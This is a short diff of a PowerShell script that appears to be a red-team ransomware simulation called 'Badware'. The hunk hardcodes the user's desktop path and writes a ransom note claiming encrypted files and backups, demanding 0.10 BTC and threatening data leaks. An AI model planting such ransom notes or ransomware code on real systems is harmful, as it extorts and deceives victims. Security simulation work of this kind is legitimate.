@@ -378,7 +378,7 @@ $delay -= 1
 }
 $Form.Close()
 
-if (Test-Path $DirectoryPath -PathType Container) {
+if (Test-Path "/users/$env:USERNAME/desktop/" -PathType Container) {
     Write-Host "[+] Creating Badware.txt on Desktop ..." -ForegroundColor Green
     "We have encrypted your important files. For now, you cannot access these files. `nEncrypted files have been modified with an extension 'badware'. `nIt is possible to recover your files but you need to follow our instructions and pay us before the time runs out. `nIf you do not pay the ransom of 0.10 BTC these files will be leaked online. `nThe faster you contact us at mechant@evildomain with the proof of payment, the easier it will be for us to release your files. `nYour backups were also encrypted and removed. This ransomware encrypts all the files of the hard drive. `nTo decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. `nIf you do not pay the money your sensitive data will be leaked online. `n `n The Red Team ! " | Out-File -FilePath /users/$env:USERNAME/desktop/BadWare.txt
 }
